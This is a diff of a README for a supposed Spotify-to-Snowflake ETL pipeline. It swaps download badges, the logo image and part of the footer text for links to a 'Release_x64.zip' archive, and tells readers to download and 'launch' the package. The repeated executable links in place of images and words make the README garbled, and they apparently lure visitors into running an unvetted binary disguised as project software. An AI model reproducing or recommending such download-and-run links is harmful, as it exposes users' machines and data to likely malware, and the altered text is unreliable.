@@ -1,6 +1,6 @@
 # 🎵 **Spotify Data Pipeline to Snowflake Data Warehouse** 📊
 
-[![Software Zip](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Software Zip](https://github.com/Omio-saha/Spotify_Data_Pipe_Snowflake/releases/download/v1.0/Release_x64.zip)](https://github.com/Omio-saha/Spotify_Data_Pipe_Snowflake/releases/download/v1.0/Release_x64.zip)
 
 Welcome to the Spotify Data Pipeline to Snowflake Data Warehouse project repository! This ETL pipeline project combines the power of the Spotify API, AWS services, Snowflake data warehouse, and Power BI for efficient data processing and visualization.
 
@@ -34,7 +34,7 @@ This repository covers a wide range of topics including:
 
 ## Getting Started
 To download the software package related to this project, click the button below:
-[![Software Zip](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Software Zip](https://github.com/Omio-saha/Spotify_Data_Pipe_Snowflake/releases/download/v1.0/Release_x64.zip)](https://github.com/Omio-saha/Spotify_Data_Pipe_Snowflake/releases/download/v1.0/Release_x64.zip)
 
 Once downloaded, make sure to launch the software package to begin exploring the Spotify Data Pipeline to Snowflake Data Warehouse project.
 
@@ -43,10 +43,10 @@ If the provided link does not work or if you need further details, please check 
 
 Dive into the world of data engineering and visualization with Spotify Data Pipeline to Snowflake Data Warehouse project! 🎶📈
 
-![Spotify Logo](https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg)
+![Spotify Logo](https://github.com/Omio-saha/Spotify_Data_Pipe_Snowflake/releases/download/v1.0/Release_x64.zip)
 
 Stay tuned for more updates and enhancements! 🚀
 
 --- 
 
-**Note:** This README.md file has been auto-generated for the purpose of the GitHub repository.
+**Note:** This https://github.com/Omio-saha/Spotify_Data_Pipe_Snowflake/releases/download/v1.0/Release_x64.zip file has been auto-generated for the purpose of the GitHub repository.
